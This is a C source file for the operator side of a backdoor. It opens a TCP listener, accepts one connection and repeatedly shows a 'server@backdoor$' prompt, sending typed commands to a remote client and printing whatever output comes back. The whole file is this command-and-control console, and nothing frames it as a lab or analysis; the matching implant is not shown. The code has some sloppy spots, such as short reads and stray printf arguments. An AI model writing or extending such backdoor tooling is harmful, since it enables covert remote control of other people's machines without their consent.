#include "connect.h"

int main(int argc, char*argv[])
{
	char buffer[300];
	int fdc;
	int fds;
	struct sockaddr_in cli;
	struct sockaddr_in serv;
	socklen_t tamanho = sizeof(cli);

	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr(LOCAL);
	serv.sin_port = htons(atoi(PORT));

	if((inet_aton(LOCAL,&serv.sin_addr))!=1){
		printf("\nincorrect IP\n");
		exit(1);
	}

	memset(serv.sin_zero,0,strlen(serv.sin_zero));
	fds = socket(AF_INET,SOCK_STREAM,0);

	if((bind(fds,(struct sockaddr *)&serv,sizeof(serv)))!=0){
		printf("\nError Binding\n");
		exit(1);
	}

	printf("Listenig...\n");
	listen(fds,1);
	fdc = accept(fds,(struct sockaddr *)&cli,&tamanho);

	if(fdc == -1){
		printf("Error trying accept client\n");
		exit(1);
	}

	printf("\nconected sucessifuly\n");
	memset(buffer,0,sizeof(buffer));

	while(1){

		printf("\nserver@backdoor$\\:");
		fgets(buffer,20,stdin);
		send(fdc,buffer,sizeof(buffer),0);

		printf("sent!\n");
		printf("receiving...\n\n");
		memset(buffer,0,sizeof(buffer));
		recv(fdc,buffer,sizeof(buffer),0);
		printf("received...\n\n");
		int a=0;

		printf("--------------------------------------\n",buffer[a]);
		while(a<sizeof(buffer)){
			if(buffer[a] == -1)
				break;
			printf("%c",buffer[a]);
			a++;
		}
		printf("--------------------------------------\n",buffer[a]);

		memset(buffer,0,sizeof(buffer));
	}

	close(fdc);
	close(fds);
	printf("\nclosed conection\n");
	exit(1);
}
